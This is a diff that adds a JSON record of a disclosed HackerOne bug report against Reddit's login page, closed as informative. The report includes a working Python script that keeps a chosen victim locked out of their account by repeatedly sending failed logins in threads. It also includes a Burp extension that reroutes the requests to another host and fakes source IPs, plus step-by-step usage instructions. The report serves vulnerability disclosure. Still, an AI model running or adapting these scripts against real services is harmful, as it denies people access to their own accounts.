@@ -1,0 +1,162 @@
+{
+  "id": 1582778,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTgyNzc4",
+  "url": "https://hackerone.com/reports/1582778",
+  "title": "Misconfigurated login page able to lock login action for any account without user interaction",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "critical",
+  "readable_substate": "Informative",
+  "created_at": "2022-05-27T10:17:28.834Z",
+  "submitted_at": "2022-05-27T10:17:28.931Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ug0x01",
+    "url": "/ug0x01",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35710,
+    "url": "https://hackerone.com/reddit",
+    "handle": "reddit",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/osci5oey0q0wkiom39bk5onv8p7q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Reddit",
+      "twitter_handle": "reddit",
+      "website": "https://www.reddit.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-06-06T23:10:51.121Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-06-01T14:07:03.125Z",
+  "team_member_agreed_on_going_public_at": "2022-06-06T23:10:50.997Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nWhile observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.\n\n## PoC\n1. Save this code as `exploit.py`:\n\n```\n#!/bin/python3\n\nfrom requests import get, post\nfrom sys import argv\nfrom warnings import filterwarnings\nfrom time import sleep\nfrom concurrent.futures import ThreadPoolExecutor\n\nfilterwarnings(\"ignore\")\n\ndef get_creds():\n    res = get(\"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\")\n    \n    csrf_token = res.text.split('name=\"csrf_token\" value=\"')[1].split('\">')[0]\n    \n    return res.cookies.get_dict(), csrf_token\n\ndef lock_account(account, cookie, csrf_token):\n    post(\"https://www.reddit.com/login\", cookies=cookie, proxies={\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}, data={\"csrf_token\": csrf_token, \"otp\": '', \"password\": \"asdasdasasdasd231321d\", \"dest\": \"https://www.reddit.com\", \"username\": account}, headers={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"https://www.reddit.com\", \"Sec-Fetch-Dest\": \"empty\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Referer\": \"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\", \"Connection\": \"close\"}, verify=False)\n\ncookie, csrf_token = get_creds()\n    \nfor _ in range(14):\n    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n\nprint(\"Account Locked!!\")\n        \nsleep(60)\n    \nwhile True:\n    cookie, csrf_token = get_creds()\n    \n    for _ in range(14):\n        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n        \n    sleep(60)\n```\n2. Save this code as `helper.py`:\n```\nfrom burp import IBurpExtender\nfrom burp import IHttpListener\n\nimport random\nimport socket\nimport struct\n\nHOST_FROM = \"www.reddit.com\"\nHOST_TO = \"ugroon.link\"\n\nclass BurpExtender(IBurpExtender, IHttpListener):\n    def registerExtenderCallbacks(self, callbacks):\n        self._helpers = callbacks.getHelpers()\n        \n        callbacks.setExtensionName(\"Traffic redirector\")\n        callbacks.registerHttpListener(self)\n\n    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):\n        helpers = self._helpers\n        if not messageIsRequest:\n            return\n        httpService = messageInfo.getHttpService()\n\n        if (HOST_FROM == httpService.getHost()):\n            message = helpers.bytesToString(messageInfo.getRequest())\n            message = message.replace(\"Host: \" + HOST_FROM, \"Host: \" + HOST_TO)\n            message_array = message.split(\"\\n\")\n            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))\n            message_array.insert(3, \"X-My-X-Forwarded-For: \" + random_ip)\n            message = \"\\n\".join(message_array)\n            \n            print(message)\n            \n            message = helpers.stringToBytes(message)\n            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))\n\n```\n3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)\n4. Download a burp which is older than 2021 version (new versions giving too many errors)\n5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`\n6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`\n7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step\n8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.\n9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.\n\n##PoC video\n\n{F1746674}\n\n#Suggested Solutions\nTo avoid issues like rate limit, use protections like captcha instead of using such protection\n\n##Notes\n1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can \"never\" login into the victim account (added for avoid misunderstandings)\n2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.\n\nCheers,\n@h1ugroon\n\n## Impact\n\nOnce the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1746674,
+      "file_name": "recording-1653645412706.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h11p01gfdkpfho5z7qc53fu0w148?response-content-disposition=attachment%3B%20filename%3D%22recording-1653645412706.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1653645412706.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUE4VWKCP%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T220720Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD6naMrPZZcKfw7S6RXCNehBLHuBcQnfLCcCCzYVvyBhwIgOqSfz2K2%2BFXY10I9q28LCuPYFM7LqF2g8H5OnbFOUPUqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNLV2P%2BPpkD3KMlnJyqOBYoB1mhdDbMSMzjL6Tibpm9I1ONzySXNg7df%2Fs8d0FU2JbuXuNacisQ1X660QSmG%2F3%2BciqIkW5jCUNJBvJZk5Pc85RSmwByIMx%2BhYE1p7B3Qyj05OrJSHdiom26i7Usa06wvKeSo%2FpOM1VA%2B38eTy1XA8c3RhSUXf%2B419EZfOgpn9Hi5jg0TA2wJ%2Bfw0OxHv%2BWeIYPRC6Fh%2FFd16jMcb%2FCPylpHZLUTPm7l0HsAsWf5LwZcU1oMDYI9ikkagk%2FxOHfLfpJ5skiC7Awd9AOMuEOs1jFntp%2BiUq1QdKg6JgJudAue3XDA8SQJmU%2BKmnly4czKwaoB0bBG4q%2FeGIFkzpUR3HydBL5Xn1qhvY%2FjLs0xTJRgOrC5OPtWUsNhCt5AUyViMhFPlViUp6oDoo0pJSdoReUmSetXoxfjOGkMtdAgg3z9d4mLhhTOBScDteqr7zFB02RKEBjQeoYqZSdFEM8K5JfR8NxBEf4hIKtK4KRZsIHiSzMR2YarABtC2%2BBlYv6dJfdv7TB4l7ktIKy7XKXSIMopeBMJoGMZYeGOpGBrDJF%2FKhtgTodkCDW5t%2FDacPF%2BDFCxEQP8BhNmF4YU47aIFpbICOoXLIEJNo2V9wVCbq5kqlLPO7iYqaJGC1keyM0HgB02RLGj3HTxU3AazIsMDq%2FXjx35eNcluNPo2nsW5qHqqzmv3OdWDZ1f2gDlV%2Fx9UuC%2Fjiam6rXog2ASpuJAgqAIjI9XVhgrE4fu1%2FoKpEgP6O21MoARrxyqUbtHjuVq5HOy9o2dZep5p62daN6BrYyVjM8BGydI7gAY%2BcU3GbTT7YunbXzbRNNO8k7ZvHtH%2BfiqS70HNd19qmOERGPGWMlgo7tXY8gTDOJmh1jDhx%2BLMBjqxAXBHOTuP43afPoNrwlfRVffcwZJut8laZzsJ0dGVZUX6Ovg5HOz96w3vVsbEEyMv3vcJO0B3YRgKP7XewFZxCiUEQedTqzQgEy1bi6avgXNpMGKs9WzjScjEO7g1gALkUIHSsw49GeJ%2FC%2FAG6kEx4y%2BGRlSgNUjhIZ4fBdCgahpCo5l4WOUXXyFrIpKAcdehJ0%2FlDXveWOGawZbsfNzLkjNPgIR%2FKDAidiU7psJ3jOyCBA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e9d38cf5ea7794625e882b410aa7416b31e06f00f9efe2b5cbd5fdb6015a7426",
+      "file_size": 59251341,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 19,
+  "voters": [
+    "shelled",
+    "he4am",
+    "0xm5awy",
+    "zy9ard3",
+    "forcedrofes",
+    "renekroka",
+    "pr0f0x01",
+    "ug0x01",
+    "0x478",
+    "shivammusic",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18825,
+    "asset_type": "URL",
+    "asset_identifier": "www.reddit.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 186834,
+      "category": "researcher",
+      "content": "A punishment for every mistake, a reward for every kindness",
+      "updated_at": "2022-08-26T22:41:07.244Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2136612,
+        "username": "ug0x01",
+        "name": "Noice 🤏",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-12-21T10:09:59.886Z",
+        "url": "https://hackerone.com/ug0x01",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
